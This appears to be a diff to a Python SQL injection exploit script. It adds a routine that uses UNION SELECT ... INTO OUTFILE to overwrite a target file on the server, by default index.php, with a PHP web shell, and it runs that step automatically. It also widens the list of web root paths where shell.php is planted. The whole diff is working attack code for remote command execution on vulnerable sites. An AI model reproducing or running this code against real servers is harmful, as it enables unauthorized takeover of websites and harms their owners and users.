@@ -46,9 +46,17 @@ def exploit(url, param, payload):
 
     return True
 
+def overwrite_file(url, param, filepath):
+    print(f"[+] Attempting to overwrite {filepath}...\n")
+    payload = f"' union select 1, <?php system($_GET[\"cmd\"]); ?> into outfile {filepath}"
+    if exploit(url, param, payload):
+        print(f"[+] Successfully overwritten {filepath}...\n")
+    else:
+        print(f"[-] Failed to overwrite {filepath}...\n")
+
 def shell_mode(url, param):
     print("[+] Attempting to upload shell to server...\n")
-    paths = ['/var/www/html/', '/var/www/', '/home/user/htdocs/', '/www/', '/public_html/', '/var/www/html/example.com/public_html/', '/usr/local/nginx/html/']
+    paths = ['./', '/var/www/html/', '/var/www/', '/home/user/htdocs/', '/www/', '/public_html/', '/var/www/html/example.com/public_html/', '/usr/local/nginx/html/']
     
     for path in paths:
         payload = f"' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile '{path}shell.php' #"
@@ -73,11 +81,15 @@ def main():
     parser.add_argument("url", help="Vulnerable URL (e.g. https://example.com/vulnerable_uri)")
     parser.add_argument("payloads", default="payloads.txt", help="File containing payloads")
     parser.add_argument("--param", default="?id=2", help="Parameter to test (default: ?id=2)")
+    parser.add_argument("--overwrite", default="./index.php", help="Overwrite file on server with web shell")
     args = parser.parse_args()
 
     url = args.url
     if not url.startswith("http"):
         url = f"https://{url}"
+
+    if args.overwrite:
+        overwrite_file(url, args.param, args.overwrite)
 
     payloads = []
     with open(args.payloads, "r") as thepayloads:
